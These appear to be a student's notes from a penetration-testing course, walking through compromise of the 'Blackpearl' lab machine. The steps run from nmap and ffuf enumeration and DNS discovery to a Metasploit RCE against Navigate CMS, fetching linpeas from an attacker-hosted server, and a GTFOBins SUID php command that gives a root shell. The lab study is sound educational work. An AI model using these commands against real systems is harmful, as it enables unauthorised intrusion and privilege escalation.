@@ -1,0 +1,26 @@
+Blackpearl
+- *sudo nmap -T4 -p- -A 192.168.194.135* reveals 22 (ssh - unlikely attack surface), 53 (dns - pssible attack surface), and 80 (http, most likely)
+- Prof seems to recommend ffuf over dirbuster, feroxbuster, etc.
+- *sufo ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.194.135/FUZZ* reveals /secret
+- navigating to 192.168.194.135/secret downloads a txt file stating that directory busting will not help here - we move to that DNS port next
+- *dnsrecon -r 127.0.0.0/24 -n 192.168.194.135 -d noot*
+	- -r: range, we set to local host
+	- -n: NS_SERVER, need to have, but not really being used
+- this gives us the following output: *PTR blackpearl.tcm 127.0.0.1* - we must add this to our local DNS
+	- *sudo nano /etc/hosts* and add the entry *192.168.194.135 blackpearl.tcm*
+	- we then reboot our browser and navigate to http://blackpearl.tcm 
+- next step: fuzz this new 'address': *sudo ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ*
+	- this reveals /navigate that presents a 'navigate cms' login.php page
+- a google search for an exploit for 'navigate cms exploit' reveals an "unauthenticated RCE available in metasploit"
+- *meterpreter > shell* - the shell command turns a meterpreter session into a shell, which then can become a fully traditional shell via "SHELL=/bin/bash script -q /dev/null" command
+- *sudo python3 -m http.server 80* on attacker
+- *wget http://192.168.194.130/linpeas.sh linpeas.sh* on victim
+	- *chmod +x linpeas.sh*
+	- *./linpeas.sh*
+	- looking for red, red/yellow in output
+- SUID (rws - means whoever runs the file can run it as owner - important if root is the owner)
+- linpeas reported several binaries that have the SUID set and are owned by root.
+- *find / -type f -perm -4000 2>/dev/null* to see those reported files again
+- we can then navigate to the 'SUID' category within the gtfobins website to see if any of these binaries are listed and thus can be used for priv. escalation
+- we copy and paste the command to use with the binary as instructed by gtfobins:
+	- */tmp$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"*
